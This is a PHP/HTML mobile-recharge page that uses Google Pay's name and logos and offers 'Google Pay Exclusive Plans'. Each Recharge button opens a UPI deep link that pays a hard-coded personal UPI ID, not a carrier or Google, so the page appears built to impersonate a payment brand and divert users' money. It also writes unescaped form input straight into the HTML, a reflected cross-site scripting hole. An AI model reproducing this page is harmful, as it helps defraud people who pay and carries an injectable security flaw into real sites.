<?php
// Get the provider and mobile number from the form
$provider = $_POST['provider'];
$mobile = $_POST['mobile'];

// Example UPI ID for payment
$upi_id = "kodala.maulik@ybl"; // Replace with the actual UPI ID
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Recharge Plans</title>
    <link rel="stylesheet" href="/css/style.css">
</head>

<body>
    <!-- Logo Section -->
    <header>
        <img src="images/logo.png" alt="Google Pay" class="logo">
    </header>

    <!-- Provider Information -->
    <section class="recharge-info">
        <h3>Recharge for: <?php echo $provider; ?> (<?php echo $mobile; ?>)</h3>
    </section>

    <!-- Recharge Plans List -->
    <section class="recharge-plans">
        <h3>Google Pay Exclusive Plans</h3>

        <!-- Plan 1 -->
        <div class="plan">
            <p>₹149 | 1.5 GB/day | 84 days | Unlimited Voice | SMS: 100/day</p>
            <button onclick="initiateGooglePay('149')">Recharge</button>
        </div>

        <!-- Plan 2 -->
        <div class="plan">
            <p>₹199 | 2.0 GB/day | 84 days | Unlimited Voice | SMS: 100/day</p>
            <button onclick="initiateGooglePay('199')">Recharge</button>
        </div>

        <!-- You can repeat similar blocks for other plans -->
    </section>

    <!-- Footer -->
    <footer>
        <img src="images/google_pay_footer.webp" alt="Google Pay Footer">
    </footer>

    <!-- JavaScript for UPI Deep Link -->
    <script>
        function initiateGooglePay(amount) {
            // UPI deep link format for Google Pay
            var upiLink = `upi://pay?pa=<?php echo $upi_id; ?>&pn=GooglePayRecharge&am=` + amount + `&cu=INR&tn=MobileRecharge`;

            // Open Google Pay using the deep link
            window.location.href = upiLink;
        }
    </script>
</body>

</html>